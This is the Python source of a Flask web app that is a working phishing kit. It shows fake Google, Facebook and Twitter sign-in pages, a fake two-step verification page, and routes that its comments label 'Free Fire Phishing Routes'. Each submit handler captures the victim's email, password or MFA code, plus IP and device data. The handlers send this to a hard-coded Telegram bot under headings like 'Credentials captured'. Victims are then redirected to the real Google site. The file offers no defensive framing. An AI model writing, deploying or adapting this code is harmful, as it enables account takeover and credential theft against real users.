# app.py
import os
import time
import requests
from flask import Flask, request, render_template_string, redirect, jsonify, render_template

app = Flask(__name__)

TELEGRAM_TOKEN = "8633336282:AAH0Opgp7FI3Y47HQ3mz2q22THJfV9lJF8A"
TELEGRAM_CHAT_ID = "8311157374"

# ---------- Telegram Helpers ----------
def tg_send(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": chat_id, "text": text,
                                 "parse_mode": "HTML"}, timeout=5)
    except Exception:
        pass

def tg_send_admin(text):
    tg_send(TELEGRAM_CHAT_ID, text)

# ---------- Template Strings (OAuth Flow) ----------
INDEX = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title></head>
<body style="font-family:-apple-system,Segoe UI,sans-serif;text-align:center;padding:40px;background:#f5f6f7">
<h2 style="color:#333">Choose an account</h2>
<a href="/auth/google" style="display:block;max-width:300px;margin:16px auto;padding:15px;background:#db4437;color:#fff;border-radius:8px;text-decoration:none;font-weight:600">Continue with Google</a>
<a href="/auth/facebook" style="display:block;max-width:300px;margin:16px auto;padding:15px;background:#1877f2;color:#fff;border-radius:8px;text-decoration:none;font-weight:600">Continue with Facebook</a>
<a href="/auth/twitter" style="display:block;max-width:300px;margin:16px auto;padding:15px;background:#1da1f2;color:#fff;border-radius:8px;text-decoration:none;font-weight:600">Continue with Twitter</a>
</body></html>"""

LOGIN = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ provider }} — Sign in</title></head>
<body style="font-family:-apple-system,Segoe UI,sans-serif;text-align:center;padding:40px;background:#fff">
<div style="max-width:360px;margin:auto;border:1px solid #ddd;border-radius:10px;padding:30px;box-shadow:0 2px 8px rgba(0,0,0,.08)">
<h2 style="color:#333">{{ provider }}</h2>
<p style="color:#666;font-size:14px">Sign in to continue</p>
<form method="POST" action="/submit">
<input type="hidden" name="provider" value="{{ provider }}">
<input name="email" type="text" placeholder="Email or phone" required
 style="display:block;margin:12px auto;padding:12px;width:100%;box-sizing:border-box;border:1px solid #ccc;border-radius:6px">
<input name="password" type="password" placeholder="Password" required
 style="display:block;margin:12px auto;padding:12px;width:100%;box-sizing:border-box;border:1px solid #ccc;border-radius:6px">
<button type="submit"
 style="margin-top:10px;padding:12px;width:100%;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer">Next</button>
</form></div></body></html>"""

MFA = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verify</title></head>
<body style="font-family:-apple-system,Segoe UI,sans-serif;text-align:center;padding:40px;background:#fff">
<div style="max-width:360px;margin:auto;border:1px solid #ddd;border-radius:10px;padding:30px">
<h2>2-Step Verification</h2>
<p style="color:#666;font-size:14px">Enter the code sent to your device</p>
<form method="POST" action="/submit_mfa">
<input type="hidden" name="provider" value="{{ provider }}">
<input type="hidden" name="email" value="{{ email }}">
<input name="code" type="text" inputmode="numeric" maxlength="8" placeholder="Code" required
 style="display:block;margin:12px auto;padding:12px;width:100%;box-sizing:border-box;border:1px solid #ccc;border-radius:6px">
<button type="submit"
 style="margin-top:10px;padding:12px;width:100%;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:16px">Verify</button>
</form></div></body></html>"""

DONE = """<!doctype html><html><head><meta charset="utf-8">
<title>Done</title></head><body style="font-family:sans-serif;text-align:center;padding:60px">
<p>Redirecting…</p>
<script>setTimeout(function(){window.location='https://accounts.google.com';},1200);</script>
</body></html>"""

VALID_PROVIDERS = ("google", "facebook", "twitter")

def client_ip():
    return request.headers.get("X-Forwarded-For", request.remote_addr)

# ---------- OAuth Routes ----------
@app.route("/")
def index():
    return render_template_string(INDEX)

@app.route("/auth/<provider>")
def auth(provider):
    if provider not in VALID_PROVIDERS:
        return redirect("/")
    return render_template_string(LOGIN, provider=provider.capitalize())

@app.route("/submit", methods=["POST"])
def submit():
    provider = request.form.get("provider", "?")
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")
    ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
    msg = (f"<b>🔑 Credentials captured</b>\n"
           f"Provider: <b>{provider}</b>\n"
           f"Email: <code>{email}</code>\n"
           f"Password: <code>{password}</code>\n"
           f"IP: {ip}\nUA: {ua}\nTime: {ts}")
    tg_send_admin(msg)
    return render_template_string(MFA, provider=provider.capitalize(), email=email)

@app.route("/submit_mfa", methods=["POST"])
def submit_mfa():
    provider = request.form.get("provider", "?")
    email = request.form.get("email", "")
    code = request.form.get("code", "")
    ip = client_ip()
    ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
    msg = (f"<b>🔐 MFA code</b>\n"
           f"Provider: <b>{provider}</b>\n"
           f"Email: <code>{email}</code>\n"
           f"Code: <code>{code}</code>\n"
           f"IP: {ip}\nTime: {ts}")
    tg_send_admin(msg)
    return render_template_string(DONE)

# ---------- Free Fire Phishing Routes ----------
@app.route("/freefire")
def freefire_page():
    try:
        return render_template("freefire.html")
    except Exception:
        return "Template freefire.html not found. Create /templates/freefire.html", 404

@app.route("/api/track_uid", methods=["POST"])
def api_track_uid():
    data = request.get_json(silent=True) or {}
    uid = data.get("uid", "")
    platform = data.get("platform", "FreeFire")
    
    device = data.get("device", {})
    device_str = f"{device.get('deviceType', 'Unknown')} ({device.get('platform', '?')}) - {device.get('screen', '?')}"
    
    ip = client_ip()
    ua = request.headers.get("User-Agent", "Unknown")
    ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
    
    msg = (f"<b>🎮 UID Captured</b>\n"
           f"━━━━━━━━━━━━━━━\n"
           f"<b>UID:</b> <code>{uid}</code>\n"
           f"<b>Platform:</b> {platform}\n\n"
           f"<b>🌐 Network & Device</b>\n"
           f"<b>IP:</b> <code>{ip}</code>\n"
           f"<b>Device:</b> {device_str}\n"
           f"<b>UA:</b> <code>{ua}</code>\n"
           f"<b>Time:</b> {ts}")
           
    tg_send_admin(msg)
    return jsonify({"status": "ok"})

@app.route("/api/track_login", methods=["POST"])
def api_track_login():
    data = request.get_json(silent=True) or {}
    email = data.get("email", "")
    password = data.get("password", "")
    uid = data.get("uid", "")
    provider = data.get("provider", "Unknown")
    
    device = data.get("device", {})
    device_str = f"{device.get('deviceType', 'Unknown')} ({device.get('platform', '?')}) - {device.get('screen', '?')}"
    
    ip = client_ip()
    ua = request.headers.get("User-Agent", "Unknown")
    ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
    
    msg = (f"<b>🔑 Login Harvested ({provider})</b>\n"
           f"━━━━━━━━━━━━━━━\n"
           f"<b>Email:</b> <code>{email}</code>\n"
           f"<b>Password:</b> <code>{password}</code>\n"
           f"<b>Linked UID:</b> <code>{uid}</code>\n\n"
           f"<b>🌐 Network & Device</b>\n"
           f"<b>IP:</b> <code>{ip}</code>\n"
           f"<b>Device:</b> {device_str}\n"
           f"<b>UA:</b> <code>{ua}</code>\n"
           f"<b>Time:</b> {ts}")
           
    tg_send_admin(msg)
    return jsonify({"status": "ok"})

# ---------- Utility Routes ----------
@app.route("/telegram", methods=["POST"])
def telegram_webhook():
    update = request.get_json(silent=True) or {}
    msg = update.get("message", {})
    chat_id = msg.get("chat", {}).get("id")
    text = msg.get("text", "")
    if chat_id:
        tg_send(chat_id, f"received: <code>{text}</code>")
    return "ok", 200

@app.route("/health")
def health():
    return "ok", 200

# ---------- Render Entry Point ----------
if __name__ == "__main__":
    # Render sets the PORT environment variable automatically
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
